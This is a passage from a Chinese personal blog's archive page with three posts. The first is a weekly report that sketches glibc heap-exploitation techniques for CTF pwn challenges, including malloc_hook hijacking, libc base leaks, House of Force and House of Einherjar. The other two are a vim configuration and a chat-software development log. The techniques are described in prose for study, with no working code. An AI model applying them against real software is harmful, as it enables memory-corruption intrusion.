<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">function</span><span class="params">(<span class="keyword">void</span> * ptr ,<span class="keyword">size_t</span> size, <span class="keyword">void</span> * caller)</span></span></span><br></pre></td></tr></table></figure>

<p>__memalign_hook<br> 这个函数是指向的一个函数指针，不过是：<br> aligned_alloc, memalign, posix_memalign and valloc</p>
<p>__malloc_initialize_hook</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> (*__malloc_initialize_hook) (<span class="keyword">void</span>) = my_init_hook;</span><br></pre></td></tr></table></figure>
<p>是一个弱类型，只是在初始化的时候使用一次</p>
<h4 id="使用原理"><a href="#使用原理" class="headerlink" title="使用原理"></a>使用原理</h4><p>hook函数只是对malloc realloc以及free等函数有一个包装，即每当调用了这些函数后，利用hook函数，可以得到我们想要的结果，比如当前调用的动态分配内存函数的地址，hook变量的值等等,这样在debug的时候，可以知道内存泄漏的地点 </p>
<p>言归正传, 所以才会有malloc_hook修改可以实现任意目标函数执行</p>
<h4 id="一般分为以下几种劫持"><a href="#一般分为以下几种劫持" class="headerlink" title="一般分为以下几种劫持"></a>一般分为以下几种劫持</h4><p>got劫持, iofile劫持打OneGadget, hook劫持</p>
<h4 id="怎样获取libc基地址"><a href="#怎样获取libc基地址" class="headerlink" title="怎样获取libc基地址"></a>怎样获取libc基地址</h4><p>若没有dump函数, 可以修改free的got表为puts,然后构造好参数, 实现dump出libc中函数的地址,即可以获取libc基地址.<br>若remove掉时,没有对指针清空, 可以通过对溢出构造fake chunk实现unlink时得到main_arena地址, 计算偏移就可得到libc基地址.</p>
<h4 id="如何实现任意地址修改"><a href="#如何实现任意地址修改" class="headerlink" title="如何实现任意地址修改"></a>如何实现任意地址修改</h4><p>最关键的还是看题中的逻辑漏洞<br>比如 easyheap, babyfenshui 中添加一个item,就会malloc两个堆.就找第一个堆与第二个堆的逻辑漏洞.比如,先创建第一堆,然后再作判断漏洞<br>一般情况下,常用的还是 fastbin attack来实现 write anything anywhere.</p>
<p>上面是小白的我,进行一些基础的总结, 其实远远不止这些, 下面是正在学习的套路术语</p>
<h4 id="Off-by-one"><a href="#Off-by-one" class="headerlink" title="Off by one"></a>Off by one</h4><p>在向缓冲区输入的时,可以越界一个字节可以控制,其利用一根据题中还存在的其他漏洞来判定</p>
<h4 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h4><p>利用堆溢出修改top chunk 大小,一般采用负数来修改到大的值. 计算目标地址与top chunk的地址之差, 然后在malloc的时候设置大小为这个差值,就可以实现 write anythen anywhere.</p>
<p>一方面,需要绕过REQUEST_OUT_RANGE(req)检测, 即传给malloc的值在负数范围内,不得大于-2 * MINSIZE.一般这个情况都是满足的.</p>
<h4 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h4><p>控制 prev_size和prev_inuse字段, 可以将新malloc出来的chunk指向 anywhere</p>
<p>一般情况下, 就可以使用off by one 漏洞覆盖prev_inuse, 通过 fake chunk绕过 unlink检测.</p>
<p>控制prev_size和prev_inuse字段需要满足:chunk_at_offset(p, -((long) prevsize)), 所以直接算目标地址与当前chunk的差值.</p>
<h3 id="Unlink"><a href="#Unlink" class="headerlink" title="Unlink"></a>Unlink</h3><p>unlink就是将双向链表中的空闲块取出来,然后和目前相邻的 free 掉的chunk进行合并</p>
<p>目前也正在学习, 大概就先说这么多…</p>
<h3 id="这周遇到的问题"><a href="#这周遇到的问题" class="headerlink" title="这周遇到的问题"></a>这周遇到的问题</h3><p>生活琐事: 自己在转转购买东西, 天天催发货, 后面发货发错了,我就要求商家退款,可是商家不退, 我前天就搞一上午的信息搜集,正准备采用这招搞他, 后面还是想想, 若才用这招威胁, 可能一分钱也得不到, 人的心也是肉做的, 采用社工的方式,求个情, 然后后面就退钱了, 被坑400.唉,耽误时间有浪费钱啊.下次不再在转转平台上买东西了.(其实这个东西我后面了解到, 是违反法律的黑产, 违法刑法155条, 损失400块就当作是个教训, 买东西还是到正规的店中去买, 不要贪图便宜) </p>
<p>对于堆利用, 常挂在嘴边说, 就是没有好好做, 反省一下自己, 以后天天搞.向师傅们学习.</p>
<h3 id="下周计划"><a href="#下周计划" class="headerlink" title="下周计划"></a>下周计划</h3><p>把各种套路理清楚, 跟着师傅们的思路走, 整理各种脚本, 方便真正开打的时候直接上脚本,也要学习一下如何批量提交flag脚本.</p>
<p>只要学不死, 就望死里学……下周的我…</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/03/28/weekly-report-1/" data-id="ckhemv81b001twdcm5gt5anxr" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-linux-vim-config" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/25/linux-vim-config/" class="article-date">
  <time datetime="2020-03-25T03:43:46.000Z" itemprop="datePublished">2020-03-25</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/linux/">linux</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/25/linux-vim-config/">linux-vim-config</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="vim-config"><a href="#vim-config" class="headerlink" title="vim config"></a>vim config</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&quot;Author: I0gan</span><br><span class="line"></span><br><span class="line">colorscheme koehler &quot;主题</span><br><span class="line">set cursorline &quot;设置横线</span><br><span class="line"></span><br><span class="line">syntax on &quot;语法高亮</span><br><span class="line">set autowrite &quot;自动保存</span><br><span class="line">set ruler     &quot;设置尺子</span><br><span class="line">set noeb      &quot;去掉输入错误提示音</span><br><span class="line">set tabstop&#x3D;4 &quot;设置缩进为4</span><br><span class="line"></span><br><span class="line">&quot;自动缩进</span><br><span class="line">set autoindent</span><br><span class="line"></span><br><span class="line">&quot;set cindent</span><br><span class="line">&quot;统一缩进为4</span><br><span class="line">set ts&#x3D;4</span><br><span class="line">set softtabstop&#x3D;4</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set number &quot;显示行号</span><br><span class="line">&quot;set ignorecase &quot;搜索时忽略大小写</span><br><span class="line"></span><br><span class="line">&quot;搜索时逐字高亮</span><br><span class="line">set hlsearch  </span><br><span class="line">set incsearch </span><br><span class="line">set enc&#x3D;utf-8 &quot;设置编码</span><br><span class="line"></span><br><span class="line">&quot;设置鼠标可以在任何地方都使用</span><br><span class="line">set mouse&#x3D;a </span><br><span class="line">set selection&#x3D;exclusive</span><br><span class="line">set selectmode&#x3D;mouse,key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set completeopt&#x3D;preview,menu &quot;代码补全</span><br><span class="line">set clipboard&#x3D;unnamed        &quot;共享剪贴板  </span><br><span class="line">set autoread                 &quot;设置当文件被改动时自动载入</span><br><span class="line">set confirm                  &quot;在处理未保存或只读文件的时候，弹出确认</span><br><span class="line">cmap w!! w !sudo tee &gt; &#x2F;dev&#x2F;null %</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&quot;退出再次打开,光标回到原来的位置</span><br><span class="line">if has(&quot;autocmd&quot;)</span><br><span class="line">           au BufReadPost * if line(&quot;&#39;\&quot;&quot;) &gt; 1 &amp;&amp; line(&quot;&#39;\&quot;&quot;) &lt;&#x3D; line(&quot;$&quot;) | exe &quot;normal! g&#39;\&quot;&quot; | endif</span><br><span class="line">endif</span><br></pre></td></tr></table></figure>



      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/03/25/linux-vim-config/" data-id="ckhemv80n0011wdcmbn1q3q2r" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/linux/" rel="tag">linux</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-weekly-report-0" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/03/16/weekly-report-0/" class="article-date">
  <time datetime="2020-03-16T10:24:50.000Z" itemprop="datePublished">2020-03-16</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/summary/">summary</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/03/16/weekly-report-0/">2020-03-16 周报</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="最近在干什么"><a href="#最近在干什么" class="headerlink" title="最近在干什么?"></a>最近在干什么?</h3><h4 id="前一个星期-接到了一个外包-第一个-项目要求是这样的"><a href="#前一个星期-接到了一个外包-第一个-项目要求是这样的" class="headerlink" title="前一个星期, 接到了一个外包(第一个),项目要求是这样的."></a>前一个星期, 接到了一个外包(第一个),项目要求是这样的.</h4><h5 id="项目要求"><a href="#项目要求" class="headerlink" title="项目要求:"></a>项目要求:</h5><p>开发即时通讯软件, 客户端采用Qt, 服务端不限</p>
<ol>
<li>客户端和服务端都在Linux系统下运行</li>
<li>拥有比较日常化的UI (不要过于丰富,也不要太简单)</li>
<li>使用数据库储存用户信息</li>
<li>在网络传输这块采用加密,保证安全传输</li>
<li>实现注册账号,登录账号, 修改用户信息, 用户信息包含昵称,账号,头像等, 添加好友, 删除好友,同步好友信息</li>
<li>好友之间能发送消息, 且能发送文件</li>
<li>实现群消息机制</li>
<li>群里拥有有群人员列表</li>
<li>保证服务端与客户端能够长期稳定运行,</li>
<li>完成日期在2020-03-15之前(2020-03-08开始)</li>
</ol>
<h3 id="简单的一些介绍"><a href="#简单的一些介绍" class="headerlink" title="简单的一些介绍:"></a>简单的一些介绍:</h3><p>客户端与服务端采用二进制加密传输,在用户登录之后, 与QQ类似, 会拥有TCP长连接用于用于与数据库的交互操作, 采用udp进行发送消息,<br>服务端,使用多进程后台运行, 能采用命令的方式停止服务, 多线程方式进行tcp并发处理.子线程,udp消息转发, 群发,处理发送文件请求,使用链表储存在线用户, 并记录用户的网络地址信息…..<br>顺便透露一下外快吧^_^(1k+);</p>
<h3 id="来一个简单的运行机制吧"><a href="#来一个简单的运行机制吧" class="headerlink" title="来一个简单的运行机制吧:"></a>来一个简单的运行机制吧:</h3><p>实际比较复杂, 这是随便大概画画的.</p>
<p><img src="/images/weekly-report-0-1.png" alt="img"></p>
<p><img src="/images/weekly-report-0-2.png" alt="img"></p>
<p>这涉及到版权, 所以测试的原图就不发布了<br>我没啥说的,就列举一下我的开发日志</p>
<p>2020-03-09:<br>(基于我的第二个未完成的闭源即时通讯软件Liq项目进行了二次开发,所以 客户端的UI基本完毕, 只是客户端与服务端的核心交互没有做, 所以要的重新设计服务端与客户端的网络交互框架)</p>
<p>实现刷新好友列表，搜索好友,添加好友.<br>bug:<br>(添加好友时内存泄露服务端崩溃)<br>(没有实现同步刷新好友列表)<br>修复:<br>无</p>
<p>2020-03-10:<br>实现基本好友聊天..<br>实现发送与接收文件 (完成一半)<br>bug:<br>(添加好友时内存泄露服务端崩溃)<br>(没有实现同步刷新好友列表)<br>(采用tcp协议进行文件传输, tcp丢包问题太大, 是因为tcp的缓冲区过大, 导致发送粘包现象, 无法解析包的数据结构)<br>(客户端退出时, 内存发送泄露, 有free掉野指针,导致不能正常退出)<br>修复:<br>客户端退出时, 内存发送泄露, 有free掉野指针,导致不能正常退出.(修复方案:通过注释排除, 和反复调试,找到了一个函数存在问题)</p>
<p>2020-03-11:<br>预计完成目标:<br>实现基本群聊天.<br>bug:<br>(采用tcp协议进行文件传输, 虽然提供了即时响应包, 解决了粘包问题, 但是不能发送大文件)<br>(服务端内存泄露, double free, 加密数组越界)<br>(添加好友时内存泄露服务端崩溃)<br>(添加好友时没有实现同步刷新好友列表)<br>修复:<br>服务端 double free, 加密数组越界<br>tcp程序处理不过来的丢包现象</p>
<p>2020-03-12:<br>更改传输文件协议从tcp改为udp (传输文件不需要经过服务中转)<br>(添加好友时内存泄露服务端崩溃)</p>
<p>bug:<br>(采用思路跟tcp一样, 发送一个包就响应一个包, 避免丢包现象, 但是还是不能发送文件)</p>
<p>2020-03-13:加固了服务端的稳定性能<br>对添加好友进行优化<br>bug:<br>(添加好友有时候内存泄露服务端崩溃)<br>多线程同时使用一个数据库的指针时, 由于同时访问该数据库, 导致数据库处理不过来,<br>数据库断开连接.</p>
<p>修复:<br>优化了数据库的封装, 采用等待机制,多个线程同时访问时, 需要等待上一个处理完毕,在再进行处理</p>
<p>2020-03-14:实现用户信息修改功能,文件传输,群人员列表<br>刷新好友列表采用每10s刷新一次<br>bug:<br>(添加好友有时候内存泄露服务端崩溃)</p>
<p>修复:<br>优化整个框架-修复了udp传输文件,原因是路径不对没有创建</p>
<p>2020-03-15:实现好友删除功能, 优化性能及调试测试</p>
<p>(添加好友有时候内存泄露服务端崩溃)</p>
<p>修复:<br>更改服务端的刷新机制,修复了添加好友时内存泄露服务端崩溃</p>
<p>…………….</p>
<h3 id="这周打算干什么"><a href="#这周打算干什么" class="headerlink" title="这周打算干什么?"></a>这周打算干什么?</h3><p>把学习这块补上来一下, 总结一下上次攻防世界的比赛不能做的Pwn题目, 加油….</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/03/16/weekly-report-0/" data-id="ckhemv817001owdcm4qjk0wbt" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/5/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
          </li>
        
          <li>
            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 i0gan<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>